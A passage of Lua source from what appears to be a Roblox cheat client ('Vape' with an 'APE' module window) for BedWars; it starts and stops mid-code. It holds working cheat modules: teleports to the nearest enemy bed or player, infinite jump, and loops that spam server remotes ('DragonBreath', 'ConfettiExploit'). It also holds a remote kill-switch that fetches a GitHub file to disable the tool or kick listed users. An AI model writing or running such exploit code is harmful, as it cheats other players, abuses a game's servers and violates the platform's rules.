	overlayframe3.Size = UDim2.new(1, 0, 0, 6)
	overlayframe3.Position = UDim2.new(0, 0, 0, 6)
	overlayframe3.BorderSizePixel = 0
	overlayframe3.Parent = overlayframe2
	local oldguiupdate = GuiLibrary.UpdateUI
	GuiLibrary.UpdateUI = function(h, s, v, ...)
		overlayframe2.BackgroundColor3 = Color3.fromHSV(h, s, v)
		return oldguiupdate(h, s, v, ...)
	end
	local framecorner1 = Instance.new("UICorner")
	framecorner1.CornerRadius = UDim.new(0, 5)
	framecorner1.Parent = overlayframe
	local framecorner2 = Instance.new("UICorner")
	framecorner2.CornerRadius = UDim.new(0, 5)
	framecorner2.Parent = overlayframe2
	local label = Instance.new("TextLabel")
	label.Size = UDim2.new(1, -7, 1, -5)
	label.TextXAlignment = Enum.TextXAlignment.Left
	label.TextYAlignment = Enum.TextYAlignment.Top
	label.Font = Enum.Font.Arial
	label.LineHeight = 1.2
	label.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
	label.TextSize = 16
	label.Text = ""
	label.BackgroundTransparency = 1
	label.TextColor3 = Color3.fromRGB(200, 200, 200)
	label.Position = UDim2.new(0, 7, 0, 5)
	label.Parent = overlayframe
	local OverlayFonts = {"Arial"}
	for i,v in pairs(Enum.Font:GetEnumItems()) do 
		if v.Name ~= "Arial" then
			table.insert(OverlayFonts, v.Name)
		end
	end
	local OverlayFont = Overlay.CreateDropdown({
		Name = "Font",
		List = OverlayFonts,
		Function = function(val)
			label.Font = Enum.Font[val]
		end
	})
	OverlayFont.Bypass = true
	Overlay.Bypass = true
	local overlayconnections = {}
	local oldnetworkowner
	local teleported = {}
	local teleported2 = {}
	local teleportedability = {}
	local teleportconnections = {}
	local pinglist = {}
	local fpslist = {}
	local matchstatechanged = 0
	local mapname = "Unknown"
	local overlayenabled = false
	
	task.spawn(function()
		pcall(function()
			mapname = workspace:WaitForChild("Map"):WaitForChild("Worlds"):GetChildren()[1].Name
			mapname = string.gsub(string.split(mapname, "_")[2] or mapname, "-", "") or "Blank"
		end)
	end)

	local function didpingspike()
		local currentpingcheck = pinglist[1] or math.floor(tonumber(game:GetService("Stats"):FindFirstChild("PerformanceStats").Ping:GetValue()))
		for i,v in pairs(pinglist) do 
			if v ~= currentpingcheck and math.abs(v - currentpingcheck) >= 100 then 
				return currentpingcheck.." => "..v.." ping"
			else
				currentpingcheck = v
			end
		end
		return nil
	end

	local function notlasso()
		for i,v in pairs(collectionService:GetTagged("LassoHooked")) do 
			if v == lplr.Character then 
				return false
			end
		end
		return true
	end
	local matchstatetick = tick()

	GuiLibrary.ObjectsThatCanBeSaved.GUIWindow.Api.CreateCustomToggle({
		Name = "Overlay", 
		Icon = "vape/assets/TargetIcon1.png", 
		Function = function(callback)
			overlayenabled = callback
			Overlay.SetVisible(callback) 
			if callback then 
				table.insert(overlayconnections, bedwars.ClientHandler:OnEvent("ProjectileImpact", function(p3)
					if not vapeInjected then return end
					if p3.projectile == "telepearl" then 
						teleported[p3.shooterPlayer] = true
					elseif p3.projectile == "swap_ball" then
						if p3.hitEntity then 
							teleported[p3.shooterPlayer] = true
							local plr = playersService:GetPlayerFromCharacter(p3.hitEntity)
							if plr then teleported[plr] = true end
						end
					end
				end))
		
				table.insert(overlayconnections, replicatedStorageService["events-@easy-games/game-core:shared/game-core-networking@getEvents.Events"].abilityUsed.OnClientEvent:Connect(function(char, ability)
					if ability == "recall" or ability == "hatter_teleport" or ability == "spirit_assassin_teleport" or ability == "hannah_execute" then 
						local plr = playersService:GetPlayerFromCharacter(char)
						if plr then
							teleportedability[plr] = tick() + (ability == "recall" and 12 or 1)
						end
					end
				end))

				table.insert(overlayconnections, vapeEvents.BedwarsBedBreak.Event:Connect(function(bedTable)
					if bedTable.player.UserId == lplr.UserId then
						bedwarsStore.statistics.beds = bedwarsStore.statistics.beds + 1
					end
				end))

				local victorysaid = false
				table.insert(overlayconnections, vapeEvents.MatchEndEvent.Event:Connect(function(winstuff)
					local myTeam = bedwars.ClientStoreHandler:getState().Game.myTeam
					if myTeam and myTeam.id == winstuff.winningTeamId or lplr.Neutral then
						victorysaid = true
					end
				end))

				table.insert(overlayconnections, vapeEvents.EntityDeathEvent.Event:Connect(function(deathTable)
					if deathTable.finalKill then
						local killer = playersService:GetPlayerFromCharacter(deathTable.fromEntity)
						local killed = playersService:GetPlayerFromCharacter(deathTable.entityInstance)
						if not killed or not killer then return end
						if killed ~= lplr and killer == lplr then 
							bedwarsStore.statistics.kills = bedwarsStore.statistics.kills + 1
						end
					end
				end))
				
				task.spawn(function()
					repeat
						local ping = math.floor(tonumber(game:GetService("Stats"):FindFirstChild("PerformanceStats").Ping:GetValue()))
						if #pinglist >= 10 then 
							table.remove(pinglist, 1)
						end
						table.insert(pinglist, ping)
						task.wait(1)
						if bedwarsStore.matchState ~= matchstatechanged then 
							if bedwarsStore.matchState == 1 then 
								matchstatetick = tick() + 3
							end
							matchstatechanged = bedwarsStore.matchState
						end
						if not bedwarsStore.TPString then
							bedwarsStore.TPString = tick().."/"..bedwarsStore.statistics.kills.."/"..bedwarsStore.statistics.beds.."/"..(victorysaid and 1 or 0).."/"..(1).."/"..(0).."/"..(0).."/"..(0)
							origtpstring = bedwarsStore.TPString
						end
						if entityLibrary.isAlive and (not oldcloneroot) then 
							local newnetworkowner = isnetworkowner(entityLibrary.character.HumanoidRootPart)
							if oldnetworkowner ~= nil and oldnetworkowner ~= newnetworkowner and newnetworkowner == false and notlasso() then 
								local respawnflag = math.abs(lplr:GetAttribute("SpawnTime") - lplr:GetAttribute("LastTeleported")) > 3
								if (not teleported[lplr]) and respawnflag then
									task.delay(1, function()
										local falseflag = didpingspike()
										if not falseflag then 
											bedwarsStore.statistics.lagbacks = bedwarsStore.statistics.lagbacks + 1
										end
									end)
								end
							end
							oldnetworkowner = newnetworkowner
						else
							oldnetworkowner = nil
						end
						teleported[lplr] = nil
						for i, v in pairs(entityLibrary.entityList) do 
							if teleportconnections[v.Player.Name.."1"] then continue end
							teleportconnections[v.Player.Name.."1"] = v.Player:GetAttributeChangedSignal("LastTeleported"):Connect(function()
								if not vapeInjected then return end
								for i = 1, 15 do 
									task.wait(0.1)
									if teleported[v.Player] or teleported2[v.Player] or matchstatetick > tick() or math.abs(v.Player:GetAttribute("SpawnTime") - v.Player:GetAttribute("LastTeleported")) < 3 or (teleportedability[v.Player] or tick() - 1) > tick() then break end
								end
								if v.Player ~= nil and (not v.Player.Neutral) and teleported[v.Player] == nil and teleported2[v.Player] == nil and (teleportedability[v.Player] or tick() - 1) < tick() and math.abs(v.Player:GetAttribute("SpawnTime") - v.Player:GetAttribute("LastTeleported")) > 3 and matchstatetick <= tick() then 
									bedwarsStore.statistics.universalLagbacks = bedwarsStore.statistics.universalLagbacks + 1
									vapeEvents.LagbackEvent:Fire(v.Player)
								end
								teleported[v.Player] = nil
							end)
							teleportconnections[v.Player.Name.."2"] = v.Player:GetAttributeChangedSignal("PlayerConnected"):Connect(function()
								teleported2[v.Player] = true
								task.delay(5, function()
									teleported2[v.Player] = nil
								end)
							end)
						end
						local splitted = origtpstring:split("/")
						label.Text = "Session Info\nTime Played : "..os.date("!%X",math.floor(tick() - splitted[1])).."\nKills : "..(splitted[2] + bedwarsStore.statistics.kills).."\nBeds : "..(splitted[3] + bedwarsStore.statistics.beds).."\nWins : "..(splitted[4] + (victorysaid and 1 or 0)).."\nGames : "..splitted[5].."\nLagbacks : "..(splitted[6] + bedwarsStore.statistics.lagbacks).."\nUniversal Lagbacks : "..(splitted[7] + bedwarsStore.statistics.universalLagbacks).."\nReported : "..(splitted[8] + bedwarsStore.statistics.reported).."\nMap : "..mapname
						local textsize = textService:GetTextSize(label.Text, label.TextSize, label.Font, Vector2.new(9e9, 9e9))
						overlayframe.Size = UDim2.new(0, math.max(textsize.X + 19, 200), 0, (textsize.Y * 1.2) + 6)
						bedwarsStore.TPString = splitted[1].."/"..(splitted[2] + bedwarsStore.statistics.kills).."/"..(splitted[3] + bedwarsStore.statistics.beds).."/"..(splitted[4] + (victorysaid and 1 or 0)).."/"..(splitted[5] + 1).."/"..(splitted[6] + bedwarsStore.statistics.lagbacks).."/"..(splitted[7] + bedwarsStore.statistics.universalLagbacks).."/"..(splitted[8] + bedwarsStore.statistics.reported)
					until not overlayenabled
				end)
			else
				for i, v in pairs(overlayconnections) do 
					if v.Disconnect then pcall(function() v:Disconnect() end) continue end
					if v.disconnect then pcall(function() v:disconnect() end) continue end
				end
				table.clear(overlayconnections)
			end
		end, 
		Priority = 2
	})
end)

runFunction(function()
	local ReachDisplay = {}
	local ReachLabel
	ReachDisplay = GuiLibrary.CreateLegitModule({
		Name = "Reach Display",
		Function = function(callback)
			if callback then 
				task.spawn(function()
					repeat
						task.wait(0.4)
						ReachLabel.Text = bedwarsStore.attackReachUpdate > tick() and bedwarsStore.attackReach.." studs" or "0.00 studs"
					until (not ReachDisplay.Enabled)
				end)
			end
		end
	})
	ReachLabel = Instance.new("TextLabel")
	ReachLabel.Size = UDim2.new(0, 100, 0, 41)
	ReachLabel.BackgroundTransparency = 0.5
	ReachLabel.TextSize = 15
	ReachLabel.Font = Enum.Font.Gotham
	ReachLabel.Text = "0.00 studs"
	ReachLabel.TextColor3 = Color3.new(1, 1, 1)
	ReachLabel.BackgroundColor3 = Color3.new()
	ReachLabel.Parent = ReachDisplay.GetCustomChildren()
	local ReachCorner = Instance.new("UICorner")
	ReachCorner.CornerRadius = UDim.new(0, 4)
	ReachCorner.Parent = ReachLabel
end)

task.spawn(function()
	local function createannouncement(announcetab)
		local vapenotifframe = Instance.new("TextButton")
		vapenotifframe.AnchorPoint = Vector2.new(0.5, 0)
		vapenotifframe.BackgroundColor3 = Color3.fromRGB(34, 34, 34)
		vapenotifframe.Size = UDim2.new(1, -10, 0, 50)
		vapenotifframe.Position = UDim2.new(0.5, 0, 0, -100)
		vapenotifframe.AutoButtonColor = false
		vapenotifframe.Text = ""
		vapenotifframe.Parent = shared.GuiLibrary.MainGui
		local vapenotifframecorner = Instance.new("UICorner")
		vapenotifframecorner.CornerRadius = UDim.new(0, 256)
		vapenotifframecorner.Parent = vapenotifframe
		local vapeicon = Instance.new("Frame")
		vapeicon.Size = UDim2.new(0, 40, 0, 40)
		vapeicon.Position = UDim2.new(0, 5, 0, 5)
		vapeicon.BackgroundColor3 = Color3.fromRGB(26, 26, 26)
		vapeicon.Parent = vapenotifframe
		local vapeiconicon = Instance.new("ImageLabel")
		vapeiconicon.BackgroundTransparency = 1
		vapeiconicon.Size = UDim2.new(1, -10, 1, -10)
		vapeiconicon.AnchorPoint = Vector2.new(0.5, 0.5)
		vapeiconicon.Position = UDim2.new(0.5, 0, 0.5, 0)
		vapeiconicon.Image = getcustomasset("vape/assets/VapeIcon.png")
		vapeiconicon.Parent = vapeicon
		local vapeiconcorner = Instance.new("UICorner")
		vapeiconcorner.CornerRadius = UDim.new(0, 256)
		vapeiconcorner.Parent = vapeicon
		local vapetext = Instance.new("TextLabel")
		vapetext.Size = UDim2.new(1, -55, 1, -10)
		vapetext.Position = UDim2.new(0, 50, 0, 5)
		vapetext.BackgroundTransparency = 1
		vapetext.TextScaled = true
		vapetext.RichText = true
		vapetext.Font = Enum.Font.Ubuntu
		vapetext.Text = announcetab.Text
		vapetext.TextColor3 = Color3.new(1, 1, 1)
		vapetext.TextXAlignment = Enum.TextXAlignment.Left
		vapetext.Parent = vapenotifframe
		tweenService:Create(vapenotifframe, TweenInfo.new(0.3), {Position = UDim2.new(0.5, 0, 0, 5)}):Play()
		local sound = Instance.new("Sound")
		sound.PlayOnRemove = true
		sound.SoundId = "rbxassetid://6732495464"
		sound.Parent = workspace
		sound:Destroy()
		vapenotifframe.MouseButton1Click:Connect(function()
			local sound = Instance.new("Sound")
			sound.PlayOnRemove = true
			sound.SoundId = "rbxassetid://6732690176"
			sound.Parent = workspace
			sound:Destroy()
			vapenotifframe:Destroy()
		end)
		game:GetService("Debris"):AddItem(vapenotifframe, announcetab.Time or 20)
	end

	local function rundata(datatab, olddatatab)
		if not olddatatab then
			if datatab.Disabled then 
				coroutine.resume(coroutine.create(function()
					repeat task.wait() until shared.VapeFullyLoaded
					task.wait(1)
					GuiLibrary.SelfDestruct()
				end))
				game:GetService("StarterGui"):SetCore("SendNotification", {
					Title = "Vape",
					Text = "Vape is currently disabled, please use vape later.",
					Duration = 30,
				})
			end
			if datatab.KickUsers and datatab.KickUsers[tostring(lplr.UserId)] then
				lplr:Kick(datatab.KickUsers[tostring(lplr.UserId)])
			end
		else
			if datatab.Disabled then 
				coroutine.resume(coroutine.create(function()
					repeat task.wait() until shared.VapeFullyLoaded
					task.wait(1)
					GuiLibrary.SelfDestruct()
				end))
				game:GetService("StarterGui"):SetCore("SendNotification", {
					Title = "Vape",
					Text = "Vape is currently disabled, please use vape later.",
					Duration = 30,
				})
			end
			if datatab.KickUsers and datatab.KickUsers[tostring(lplr.UserId)] then
				lplr:Kick(datatab.KickUsers[tostring(lplr.UserId)])
			end
			if datatab.Announcement and datatab.Announcement.ExpireTime >= os.time() and (datatab.Announcement.ExpireTime ~= olddatatab.Announcement.ExpireTime or datatab.Announcement.Text ~= olddatatab.Announcement.Text) then 
				task.spawn(function()
					createannouncement(datatab.Announcement)
				end)
			end	
		end
	end
	task.spawn(function()
		pcall(function()
			if (inputService.TouchEnabled or inputService:GetPlatform() == Enum.Platform.UWP) and lplr.UserId ~= 3826618847 then return end
			if not isfile("vape/Profiles/bedwarsdata.txt") then 
				local commit = "main"
				for i,v in pairs(game:HttpGet("https://github.com/7GrandDadPGN/VapeV4ForRoblox"):split("\n")) do 
					if v:find("commit") and v:find("fragment") then 
						local str = v:split("/")[5]
						commit = str:sub(0, str:find('"') - 1)
						break
					end
				end
				writefile("vape/Profiles/bedwarsdata.txt", game:HttpGet("https://raw.githubusercontent.com/7GrandDadPGN/VapeV4ForRoblox/"..commit.."/CustomModules/bedwarsdata", true))
			end
			local olddata = readfile("vape/Profiles/bedwarsdata.txt")

			repeat
				local commit = "main"
				for i,v in pairs(game:HttpGet("https://github.com/7GrandDadPGN/VapeV4ForRoblox"):split("\n")) do 
					if v:find("commit") and v:find("fragment") then 
						local str = v:split("/")[5]
						commit = str:sub(0, str:find('"') - 1)
						break
					end
				end
				
				local newdata = game:HttpGet("https://raw.githubusercontent.com/7GrandDadPGN/VapeV4ForRoblox/"..commit.."/CustomModules/bedwarsdata", true)
				if newdata ~= olddata then 
					rundata(game:GetService("HttpService"):JSONDecode(newdata), game:GetService("HttpService"):JSONDecode(olddata))
					olddata = newdata
					writefile("vape/Profiles/bedwarsdata.txt", newdata)
				end

				task.wait(10)
			until not vapeInjected
		end)
	end)
end)

task.spawn(function()
	repeat task.wait() until shared.VapeFullyLoaded
	if not AutoLeave.Enabled then 
		AutoLeave.ToggleButton(false)
	end
end)

if lplr.UserId == 4943216782 then 
	lplr:Kick('mfw, discord > vaperoblox')
end

GuiLibrary.RemoveObject("PanicOptionsButton")
GuiLibrary.RemoveObject("MissileTPOptionsButton")
GuiLibrary.RemoveObject("SwimOptionsButton")
GuiLibrary.RemoveObject("FullbrightOptionsButton")
GuiLibrary.RemoveObject("HighJumpOptionsButton")
GuiLibrary.RemoveObject("AutoRelicOptionsButton")
GuiLibrary.RemoveObject("RavenTPOptionsButton")
GuiLibrary.RemoveObject("XrayOptionsButton")
GuiLibrary.RemoveObject("SchematicaOptionsButton")

runFunction(function()
	local hasTeleported = false
	local TweenService = game:GetService("TweenService")

	function findNearestBed()
		local nearestBed = nil
		local minDistance = math.huge

		for _,v in pairs(game.Workspace:GetDescendants()) do
			if v.Name:lower() == "bed" and v:FindFirstChild("Covers") and v:FindFirstChild("Covers").BrickColor ~= lplr.Team.TeamColor then
				local distance = (v.Position - lplr.Character.HumanoidRootPart.Position).magnitude
				if distance < minDistance then
					nearestBed = v
					minDistance = distance
				end
			end
		end
		return nearestBed
	end
	function tweenToNearestBed()
		local nearestBed = findNearestBed()
		if nearestBed and not hasTeleported then
			hasTeleported = true

			local tweenInfo = TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out, 0, false, 0)

			local tween = TweenService:Create(lplr.Character.HumanoidRootPart, TweenInfo.new(0.98), {CFrame = nearestBed.CFrame + Vector3.new(0, 2, 0)})
			tween:Play()
		end
	end
	BedTp = GuiLibrary.ObjectsThatCanBeSaved.APEWindow.Api.CreateOptionsButton({
		Name = "BedTp",
		Function = function(callback)
			if callback then
				lplr.Character:FindFirstChildOfClass("Humanoid"):ChangeState(Enum.HumanoidStateType.Dead)
				lplr.CharacterAdded:Connect(function()
					wait(0.3) 
					tweenToNearestBed()
				end)
				hasTeleported = false
				warningNotification("APE", "Tping To Random Bed!", 5)
				BedTp["ToggleButton"](false)
			end
		end,
		["HoverText"] = "tp to closest bed v2"
	})
end)

runFunction(function()
    local hasTeleported = false
    local TweenService = game:GetService("TweenService")

    function findNearestPlayer()
        local nearestPlayer = nil
        local minDistance = math.huge

        for _,v in pairs(game.Players:GetPlayers()) do
            if v ~= lplr and v.Character and v.Character:FindFirstChild("HumanoidRootPart") and v.Team ~= lplr.Team and v.Character:FindFirstChild("Humanoid").Health > 0 then
                local distance = (v.Character.HumanoidRootPart.Position - lplr.Character.HumanoidRootPart.Position).magnitude
                if distance < minDistance then
                    nearestPlayer = v
                    minDistance = distance
                end
            end
        end
        return nearestPlayer
    end


    function tweenToNearestPlayer()
        local nearestPlayer = findNearestPlayer()
        if nearestPlayer and not hasTeleported then
            hasTeleported = true

            local tweenInfo = TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out, 0, false, 0)

            local tween = TweenService:Create(lplr.Character.HumanoidRootPart, TweenInfo.new(0.94), {CFrame = nearestPlayer.Character.HumanoidRootPart.CFrame + Vector3.new(0, 2, 0)})
            tween:Play()
        end
    end

    PlayerTp = GuiLibrary.ObjectsThatCanBeSaved.APEWindow.Api.CreateOptionsButton({
        Name = "PlayerTP",
        Function = function(callback)
            if callback then
                lplr.Character:FindFirstChildOfClass("Humanoid"):ChangeState(Enum.HumanoidStateType.Dead)
                lplr.CharacterAdded:Connect(function()
                    wait(0.3)
                    tweenToNearestPlayer()
                end)
                hasTeleported = false
				warningNotification("APE", "Tping To Random Player!", 5)
                PlayerTp["ToggleButton"](false)
            end
        end,
        ["HoverText"] = "Teleports you to the closest player that is not on your team (BETA)"
    })
end)

runFunction(function()
	InfiniteJump = GuiLibrary.ObjectsThatCanBeSaved.APEWindow.Api.CreateOptionsButton({
		Name = "InfiniteJump",
		Function = function(callback)
			if callback then

			end
		end
	})
	game:GetService("UserInputService").JumpRequest:Connect(function()
		if not InfiniteJump.Enabled then return end
		local localPlayer = game:GetService("Players").LocalPlayer
		local character = localPlayer.Character
		if character and character:FindFirstChildOfClass("Humanoid") then
			local humanoid = character:FindFirstChildOfClass("Humanoid")
			humanoid:ChangeState("Jumping")
		end
	end)         
end)

runFunction(function()
local fpsunlocker = {Enabled = false}
fpsunlocker = GuiLibrary["ObjectsThatCanBeSaved"]["APEWindow"]["Api"].CreateOptionsButton({
   Name = "FPS Unlocker",
   Function = function(callback)
   if callback then
      setfpscap(9e9)
   else
      setfpscap(60)
   end
end
})
end)

runFunction(function()
	DragonBreath = GuiLibrary.ObjectsThatCanBeSaved.APEWindow.Api.CreateOptionsButton({
		Name = "DragonBreath",
		HoverText = "be a dragon lel",
		Function = function(callback)
			if callback then 
				task.spawn(function()
					repeat 
						task.wait(0.3) 
						game:GetService("ReplicatedStorage"):WaitForChild("rbxts_include"):WaitForChild("node_modules"):WaitForChild("@rbxts"):WaitForChild("net"):WaitForChild("out"):WaitForChild("_NetManaged"):WaitForChild("DragonBreath"):FireServer({player = game:GetService("Players").LocalPlayer})
					until (not DragonBreath.Enabled)
				end)
			end
		end
	})
end)

runFunction(function()
    local Confetti = {Enabled = false}
    Confetti = GuiLibrary.ObjectsThatCanBeSaved.APEWindow.Api.CreateOptionsButton({
        Name = "ConfettiExploit",
        Function = function(callback)
            if callback then 
                task.spawn(function()
                    repeat 
                        task.wait(0.001) 
                        game:GetService("ReplicatedStorage"):WaitForChild("events-@easy-games/game-core:shared/game-core-networking@getEvents.Events"):WaitForChild("useAbility"):FireServer("PARTY_POPPER")
                    until (not Confetti.Enabled)
                end)
            end
        end,
      HoverText = "Fixed  Confetti Exploit"
    })
end)

runFunction(function()
local lplr = game:GetService("Players").LocalPlayer
local KnitClient = debug.getupvalue(require(lplr.PlayerScripts.TS.knit).setup, 6)
local Client = require(game:GetService("ReplicatedStorage").TS.remotes).default.Client
local Notify = {["Enabled"] = false}
-- Bed Broken Notification
Client:WaitFor("BedwarsBedBreak"):andThen(function(p13)
p13:Connect(function(p14)
	if Notify["Enabled"] then
		local team = p14.brokenBedTeam.displayName
		if team == lplr.Team.Name then
			warningNotification("APE", "bed broke, L", 3.2)
			end
		end
	end)
end)
-- Break Bed Notification
Client:WaitFor("BedwarsBedBreak"):andThen(function(p13)
p13:Connect(function(p14)
	if Notify["Enabled"] then
		if p14.player.Name == lplr.Name then
			warningNotification("APE", "you broke a bed! nice", 2)
			end
		end
	end)
end)
-- Kill Player Notification
Client:WaitFor("EntityDeathEvent"):andThen(function(p6)
p6:Connect(function(p7)
	if Notify["Enabled"] then
		if p7.fromEntity == lplr.Character then
			local plr = playersService:GetPlayerFromCharacter(p7.entityInstance)
			warningNotification("APE", "you killed "..(plr.name), 3)
			end
		end
	end)
end)
local Notify = GuiLibrary["ObjectsThatCanBeSaved"]["UtilityWindow"]["Api"].CreateOptionsButton({
["Name"] = "Notifications",
["Function"]= function(callback) Notify["Enabled"] = callback end,
["HoverText"] = "Notifys you when certain actions happen"
})
end)
			
runFunction(function()
    local ChatMover = {Enabled = false}
    ChatMover = GuiLibrary.ObjectsThatCanBeSaved.APEWindow.Api.CreateOptionsButton({
        Name = "ChatMover",
        HoverText = "Move chat to the bottom",
        Function = function(callback)
            if callback then
                game:GetService("TextChatService").ChatWindowConfiguration.HorizontalAlignment = Enum.HorizontalAlignment.Left
                game:GetService("TextChatService").ChatWindowConfiguration.VerticalAlignment = Enum.VerticalAlignment.Center
            else
                game:GetService("TextChatService").ChatWindowConfiguration.HorizontalAlignment = Enum.HorizontalAlignment.Top
                game:GetService("TextChatService").ChatWindowConfiguration.VerticalAlignment = Enum.VerticalAlignment.Center
            end
        end
    })
end)

runFunction(function()
local anim = {["Enabled"] = false}
	anim = GuiLibrary["ObjectsThatCanBeSaved"]["APEWindow"]["Api"].CreateOptionsButton({
		["Name"] = "AnimationChanger",
		["HoverText"] = "gives you a FE Animation Pack. Its also customizable",
		["Function"] = function(callback)
			if callback then
				task.spawn(function()
				local Hum = game.Players.LocalPlayer.Character:FindFirstChild("Humanoid")
					if not Hum then
						repeat task.wait() until Hum
					end
				local Animate = game:GetService("Players").LocalPlayer.Character.Animate
				----Cartoony
				if animrun.Value == "Cartoony" and animtype.Value == "Custom" then
					Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=10921076136" 	
			end
	if animwalk.Value == "Cartoony" and animtype.Value == "Custom" then
		Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=10921082452"
	end
	if animfall.Value == "Cartoony" and animtype.Value == "Custom" then
		Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=10921077030"
		end
		if animjump.Value == "Cartoony" and animtype.Value == "Custom" then
			Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=10921078135"
		end
		if animidle.Value == "Cartoony" and animtype.Value == "Custom" then
			Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=10921071918"
			Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=10921072875"
		end
		if animclimb.Value == "Cartoony" and animtype.Value == "Custom" then
			Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=10921070953"
		end
		----Levitation
				if animrun.Value == "Levitation" and animtype.Value == "Custom" then
					Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=10921135644" 	
			end
	
			if animwalk.Value == "Levitation" and animtype.Value == "Custom" then
		Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=10921140719"
	end
	if animfall.Value == "Levitation" and animtype.Value == "Custom" then
		Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=10921136539"
		end
		if animjump.Value == "Levitation" and animtype.Value == "Custom" then
			Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=10921137402"
		end
		if animidle.Value == "Levitation" and animtype.Value == "Custom" then
			Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=10921132962"
			Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=10921133721"
		end
			if animwalk.Value == "Levitation" and animtype.Value == "Custom" then
		Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=10921140719"
	end
	if animfall.Value == "Levitation" and animtype.Value == "Custom" then
		Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=10921136539"
		end
		if animjump.Value == "Levitation" and animtype.Value == "Custom" then
			Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=10921137402"
		end
		if animidle.Value == "Levitation" and animtype.Value == "Custom" then
			Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=10921132962"
			Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=10921133721"
		end
		if animclimb.Value == "Levitation" and animtype.Value == "Custom" then
			Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=10921132092"
		end
---Robot
		if animrun.Value == "Robot" and animtype.Value == "Custom" then
			Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=10921250460" 	
	end

	if animwalk.Value == "Robot" and animtype.Value == "Custom" then
Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=10921255446"
end
if animfall.Value == "Robot" and animtype.Value == "Custom" then
Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=10921251156"
end
if animjump.Value == "Robot" and animtype.Value == "Custom" then
	Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=10921252123"
end
if animidle.Value == "Robot" and animtype.Value == "Custom" then
	Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=10921248039"
	Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=10921248831"
end
if animclimb.Value == "Robot" and animtype.Value == "Custom" then
	Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=10921247141"
end
---Stylish
if animrun.Value == "Stylish" and animtype.Value == "Custom" then
			Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=10921276116" 	
	end
	if animwalk.Value == "Stylish" and animtype.Value == "Custom" then
Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=10921283326"
end
if animfall.Value == "Stylish" and animtype.Value == "Custom" then
Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=10921278648"
end
if animjump.Value == "Stylish" and animtype.Value == "Custom" then
	Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=10921279832"
end
if animidle.Value == "Stylish" and animtype.Value == "Custom" then
	Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=10921272275"
	Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=10921273958"
end
if animclimb.Value == "Stylish" and animtype.Value == "Custom" then
	Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=10921271391"
end
---Superhero
if animrun.Value == "Superhero" and animtype.Value == "Custom" then
	Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=10921291831" 	
end
if animwalk.Value == "Superhero" and animtype.Value == "Custom" then
Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=10921298616"
end
if animfall.Value == "Superhero" and animtype.Value == "Custom" then
Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=10921293373"
end
if animjump.Value == "Superhero" and animtype.Value == "Custom" then
Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=10921294559"
end
if animidle.Value == "Superhero" and animtype.Value == "Custom" then
Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=10921288909"
Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=10921290167"
end
if animclimb.Value == "Superhero" and animtype.Value == "Custom" then
Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=10921286911"
end
---Zombie (this animation is garbage lol)
if animrun.Value == "Zombie" and animtype.Value == "Custom" then
	Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=616163682" 	
end
if animwalk.Value == "Zombie" and animtype.Value == "Custom" then
Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=10921355261"
end
if animfall.Value == "Zombie" and animtype.Value == "Custom" then
Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=10921350320"
warningNotification("Spider","Spider doesn't work well with the Zombie fall. So don't recommend using it",5)
end
if animjump.Value == "Zombie" and animtype.Value == "Custom" then
Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=10921351278"
end
if animidle.Value == "Zombie" and animtype.Value == "Custom" then
Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=10921344533"
Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=10921345304"
end
if animclimb.Value == "Zombie" and animtype.Value == "Custom" then
Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=10921343576"
end
---Ninja
if animrun.Value == "Ninja" and animtype.Value == "Custom" then
